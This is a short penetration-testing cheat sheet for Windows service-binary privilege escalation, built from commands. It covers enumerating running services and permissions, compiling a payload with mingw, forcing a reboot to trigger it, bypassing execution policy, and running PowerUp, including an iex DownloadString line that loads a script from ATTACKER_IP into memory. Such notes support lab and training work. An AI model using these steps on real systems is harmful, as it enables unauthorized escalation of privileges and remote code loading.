#In order to substitute a modificable binary that is running as an active service (for example mysql), we must first mv the binary in order to replace it. Otherwise the overwrite operation will triger an error

######################################################################
#### icacls permissions mask ####

# +Mask+++++++Permissions+
#   F		       Full access
#   M		       Modify access
#   RX	       Read and execute access
#   R		       Read-only access
#   W		       Write-only access
######################################################################
-------------------------------
######### From PowerShell #########

#List running services.
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

#Check service startmode.
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
------------------------------
######### From CMD #########

#Check file/directory permissions.
icacls "<FILEPATH>"

#Check privileges or membership groups.
whoami /priv - /group

#Start/Stop/Restart Services.
Start-Service <SERVICE_NAME>
Restart-Service <SERVICE_NAME>
Stop-Service <SERVICE_NAME>

#Restart machine to trigger auto-mode services payloads.
shutdown /r /t 0
------------------------------
######### From Kali #########

#Compile C code to a service binary.
x86_64-w64-mingw32-gcc <CODENAME>.c -o <DESTNAME>.exe
------------------------------
######### PowerUp #########

powershell -ep bypass

#Import correctly powerup module.
Import-Module .\PowerUp.ps1; . .\PowerUp.ps1

#Load PowerUp.ps1 directly on memory.
iex (New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/PowerUp.ps1')

#Displays all vulnerabilties founded.
Invoke-AllChecks

#List bin paths of modifiables services files.
Get-ModifiableServiceFile
